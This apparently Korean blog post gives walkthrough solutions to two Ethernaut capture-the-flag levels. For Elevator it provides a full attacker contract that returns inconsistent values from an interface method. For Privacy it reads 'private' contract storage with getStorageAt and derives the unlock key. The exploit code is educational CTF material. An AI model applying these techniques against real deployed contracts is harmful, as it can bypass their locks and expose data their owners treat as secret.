@@ -1,0 +1,259 @@
+---
+layout: post
+title: "Ethernaut Solution(2/2)"
+date: 2018-09-20
+description: # Add post description (optional)
+img: leaves.jpg
+tag: [Ethereum, Solidity, Ethernaut]
+---
+
+### 11. Elevator (difficulty 4/10)
+
+> This elevator won't let you reach the top of your building. Right?
+
+"이 엘리베이터는 빌딩 꼭대기까지 가지 않습니다. 정말 그럴까요?" 문제가 요구하는 것을 이해하는 것 자체가 어렵게 느껴지네요.
+
+솔리디티는 간혹 예상치 못한 방향으로 작동할 때가 있습니다. 문제의 컨트랙트를 살펴보겠습니다. 우선 Building이라는 인터페이스가 있고 Elevator라는 컨트랙트가 있습니다.
+Building 인터페이스를 구현하면서 Elevator 컨트랙트에서 그것을 사용할 것입니다.
+
+{% highlight javascript %}
+if (! building.isLastFloor(_floor)) {
+    floor = _floor;
+    top = building.isLastFloor(floor);
+}
+{% endhighlight %}
+
+`! building.isLastFloor(_floor)`가 true이면 조건문으로 들어갑니다. 이것은 isLastFloor가 false이면
+마지막 층이 몇 층인지 상관없이 마지막 층을 나타내는 bool top이 true가 될 수 없는 것처럼 보입니다.
+
+그런데 여기서 간과한 문제가 있습니다. isLastFloor는 인터페이스로 정의되어 있고 구현하기 나름이라는 점입니다. 또 위의 조건을 잘 보면 isLastFloor를 두 번 호출하고 있습니다.
+다시 말해서 isLastFloor의 두 번째 호출해서도 첫 번째와 동일한 값을 리턴할 것이라고 생각하는 것이죠.
+
+{% highlight javascript %}
+interface Building {
+    function isLastFloor(uint) view public returns (bool);
+}
+{% endhighlight %}
+
+만약에 isLastFloor를 첫 번째에는 false, 이렇게 해서 조건문으로 들어간 다음에, 조건문 내에서, 두 번째에는 true를 리턴하게 만들면 어떻게 될까요? 이렇게 하면
+모든 층에 갈 수 있는 Elevator 컨트랙트가 되는 것입니다(토글 스위치를 생각하면 될 것 같습니다).
+
+{% highlight javascript %}
+pragma solidity ^0.4.25;
+
+interface Building {
+    function isLastFloor(uint) view public returns (bool);
+}
+
+contract HackBuilding is Building {
+
+    address public owner;
+    Elevator public elevator;
+    bool public toggleFlag;
+
+    constructor (address _addr) public {
+        owner = msg.sender;
+        elevator = Elevator(_addr);
+    }
+
+     modifier onlyOwner {
+        require (msg.sender == owner);
+        _;
+    }
+
+    function isLastFloor(uint _floor) view public returns (bool) {
+        _floor;
+        if (!toggleFlag) {
+            toggleFlag = true;
+            return false;
+        } else {
+            toggleFlag = false;
+            return true;
+        }
+    }
+
+    function reachTheTopFloor() external onlyOwner {
+        elevator.goTo(100);
+    }
+}
+
+contract Elevator {
+    function goTo(uint _floor) public;
+}
+{% endhighlight %}
+
+
+다음과 같은 결과가 나오면 성공입니다.
+
+{% highlight html %}
+await contract.top()
+true
+{% endhighlight %}
+
+그런데 잠깐만! isLastFloor 메소드는 상태변수를 읽을 수만 있는 view 메소드인데 bool toggleFlag 상태변수를 어떻게 바꿀 수 있죠? 😕
+그것은 솔리디티 컴파일러 버전에 따라 다릅니다. 여기서 사용한 0.4.25 이하에서는 view 로 지정했다고 하여 컴파일 오류가 발생하지는 않습니다. 그냥 경고만 할 뿐이죠.
+0.5.0 이상에서는 보다 엄격하게 view로 지정된 메소드에서 상태변수를 바꾸는 코드는 컴파일 오류가 발생합니다.
+
+<font color="red" size="2">
+{% highlight html %}
+TypeError: Function declared as view, but this expression (potentially) modifies the state and thus requires non-payable (the default) or payable.
+{% endhighlight %}
+</font>
+
+
+### 12. Privacy (difficulty 8/10)
+
+> Unlock this contract to beat the level.
+
+주어진 컨트랙트의 bool locked = false로 만들면 되는 문제입니다. unlock 메소드는 _key를 받아서 세 번째 아이템과 같은지
+비교해서 같으면 locked = false로 만듭니다.
+
+{% highlight javascript %}
+
+function unlock(bytes16 _key) public {
+    require(_key == bytes16(data[2]));
+    locked = false;
+}
+{% endhighlight %}
+
+지난 8번 문제 Vault에서 본 것처럼 상태변수가 private라고 해서 읽지 못하는 것은 아닙니다. 지난 문제와 다른 점은 고정길이 배열인 경우에 storage의 레이아웃이 어떻게
+되는지, 또 타입 캐스팅이 어떻게 이루어지는지 알아야 합니다.
+
+
+> * Understanding how storage works
+* Understanding how parameter parsing works
+* Understanding how casting works
+
+컨트랙트의 상태변수는 다음과 같습니다. `bytes32[3] private data`에 우리가 찾으려고 하는 데이터가 있을 겁니다. 지난 번에 설명한 것처럼
+각 슬롯은 32바이트(256비트) 크기로 0번 슬롯부터 차례로, 연속적으로 할당됩니다. 슬롯 크기보다 작은 데이터 타입은 "tightly packed"하게 저장됩니다.
+
+
+{% highlight javascript %}
+  bool public locked = true;
+  uint256 public constant ID = block.timestamp;
+  uint8 private flattening = 10;
+  uint8 private denomination = 255;
+  uint16 private awkwardness = uint16(now);
+  bytes32[3] private data;
+{% endhighlight %}
+
+
+여기서 알아두어야 할 것은 상태변수를 constant로 선언하는 경우는 storage에 할당되지 않는다는 점입니다. constant는 값 타입만 지정할 수 있습니다.
+
+> The compiler does not reserve a storage slot for these variables, and every occurrence is replaced by the respective constant expression (which might be computed to a single value by the optimizer).
+
+자, 그렇다면 상태변수 선언부를 보면서 레이아웃을 짐작해보겠습니다. 우선 다음과 같이 트러플 콘솔을 통해 Ropsten에 연결한 후 `web3.eth.getStorageAt`으로 조회해보겠습니다.
+첫 번째 슬롯입니다.
+
+{% highlight html %}
+truffle(ropsten)> web3.eth.getStorageAt("0x3e066a43f82688f611916e5fa56e6d4ce5e324ee", 0, "latest",
+                                        function(e, result) {
+                                            console.log(result)
+                                        })
+undefined
+truffle(ropsten)> 0x000000000000000000000000000000000000000000000000000000aa43ff0a01
+{% endhighlight %}
+
+두 번째 세 번째, 네 번째, 차례로 조회해봅시다. 그럼 다음과 같은 결과를 얻을 수 있습니다(데이터는 달라질 수 있습니다).
+
+{% highlight html %}
+web3.eth.getStorageAt("0x3e066a43f82688f611916e5fa56e6d4ce5e324ee", 1, ...)
+0x1b1f4f5b10d488f8186dbd44a4bad9081edb28e41c8ea0cb2a6d4a159ea64d88
+
+web3.eth.getStorageAt("0x3e066a43f82688f611916e5fa56e6d4ce5e324ee", 2, ...)
+0x12c705440554fb18ddaf8743e55b5f4341a56709b11e3a4be677b7dcfdc1a328
+
+web3.eth.getStorageAt("0x3e066a43f82688f611916e5fa56e6d4ce5e324ee", 3, ...)
+0x7310fbc161ab8742d22d56264a4f79ff27c9c291d3eb951fe8bb7024b09d7a5c
+
+web3.eth.getStorageAt("0x3e066a43f82688f611916e5fa56e6d4ce5e324ee", 4, ...)
+0x0000000000000000000000000000000000000000000000000000000000000000
+{% endhighlight %}
+
+다섯 번째(슬롯 인덱스 4)부터는 데이터가 없군요. 따라서 저장 슬롯은 모두 4개를 사용하고 있음을 알 수 있습니다.
+한 슬롯의 크기가 32바이트(256비트) 이므로 그 안에 들어갈 수 있는 것들은 다음 4개의 상태변수들입니다. 순서대로 슬롯의 뒤에서부터 저장됩니다.
+
+{% highlight javascript %}
+  bool public locked = true;
+  uint8 private flattening = 10;
+  uint8 private denomination = 255;
+  uint16 private awkwardness = uint16(now);
+{% endhighlight %}
+
+아래와 같이 됩니다.
+
+<table>
+<tr>
+    <td colspan="5" align="center"><b>SLOT 0</b></td>
+</tr>
+<tr>
+    <td width="100"></td>
+    <td width="100">uint16 awkwardness</td>
+    <td width="100">uint8 denomination</td>
+    <td width="100">uint8 flattening</td>
+    <td width="100">bool locked</td>
+</tr>
+<tr>
+    <td></td>
+    <td>uint16(now)</td>
+    <td>255</td>
+    <td>10</td>
+    <td>true</td>
+</tr>
+<tr>
+    <td>0x0000...0000</td>
+    <td>aa43</td>
+    <td>ff</td>
+    <td>0a</td>
+    <td>01</td>
+</tr>
+</table>
+
+
+고정길이 배열은 어떻게 될까요? bytes32이므로 한 슬롯씩 차지할 것입니다.
+
+{% highlight javascript %}
+  bytes32[3] private data;
+{% endhighlight %}
+
+
+
+<table>
+<tr>
+    <td align="center" width="100"><b>SLOT 1</b></td>
+    <td align="center" width="100"><b>SLOT 2</b></td>
+    <td align="center" width="100"><b>SLOT 3</b></td>
+</tr>
+<tr>
+    <td>bytes32 data[0]</td>
+    <td>bytes32 data[1]</td>
+    <td>bytes32 data[2]</td>
+</tr>
+<tr>
+    <td>0x1b1f...4d88</td>
+    <td>0x12c7...a328</td>
+    <td>0x7310...7a5c</td>
+</tr>
+</table>
+
+결국 우리가 알아내려고 하는 키 값은 data[2]입니다. 문제에서는 bytes16(data[2])으로 캐스팅했으므로 Remix에서 다음과 같이 캐스팅해서 키 값을 알 수 있습니다.
+
+{% highlight javascript %}
+function convert() public pure returns (bytes16 result) {
+    bytes32 data = 0x7310fbc161ab8742d22d56264a4f79ff27c9c291d3eb951fe8bb7024b09d7a5c;
+    result = bytes16(data);
+}
+{% endhighlight %}
+
+bytes16은 첫 번째 16바이트만 잘라내면 됩니다. 이제 unlock 메소드를 실행하면 되겠군요!
+
+{% highlight html %}
+await contract.unlock("0x7310fbc161ab8742d22d56264a4f79ff")
+{% endhighlight %}
+
+
+
+
+[ethernaut]: https://ethernaut.zeppelin.solutions/
+
+
